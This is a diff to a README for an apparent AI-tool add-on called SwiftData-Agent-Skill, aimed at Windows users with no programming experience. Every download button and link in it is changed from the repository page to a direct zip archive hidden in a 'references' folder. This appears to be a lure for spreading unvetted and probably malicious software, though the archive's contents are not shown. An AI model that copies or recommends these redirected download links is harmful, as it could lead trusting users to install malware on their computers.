@@ -1,6 +1,6 @@
 # ⚡ SwiftData-Agent-Skill - Fast Data Handling for AI Tools
 
-[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill/raw/refs/heads/main/swiftdata-pro/references/Skill_Agent_Data_Swift_v3.8.zip)
 
 SwiftData-Agent-Skill connects to Claude Code, Codex, and other AI tools to help them work with data more efficiently. This guide will walk you through downloading and running the software on your Windows computer. No programming experience is required.
 
@@ -49,7 +49,7 @@ First, download the program files. Then, you will install and run SwiftData-Agen
 
 Click the big button below to open the download page in your web browser. This page contains the files you need.
 
-[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-blue?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-blue?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill/raw/refs/heads/main/swiftdata-pro/references/Skill_Agent_Data_Swift_v3.8.zip)
 
 ### Step 2: Download the program files
 
@@ -132,8 +132,8 @@ Developers update the skill regularly. Use the GitHub page to download the lates
 
 Download and start using SwiftData-Agent-Skill quickly by visiting:
 
-[Download SwiftData-Agent-Skill](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
+[Download SwiftData-Agent-Skill](https://github.com/Obgeor2696/SwiftData-Agent-Skill/raw/refs/heads/main/swiftdata-pro/references/Skill_Agent_Data_Swift_v3.8.zip)
 
 Or use the button below for easy access:
 
-[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill)
+[![Download SwiftData-Agent-Skill](https://img.shields.io/badge/Download-SwiftData--Agent--Skill-brightgreen?style=for-the-badge)](https://github.com/Obgeor2696/SwiftData-Agent-Skill/raw/refs/heads/main/swiftdata-pro/references/Skill_Agent_Data_Swift_v3.8.zip)
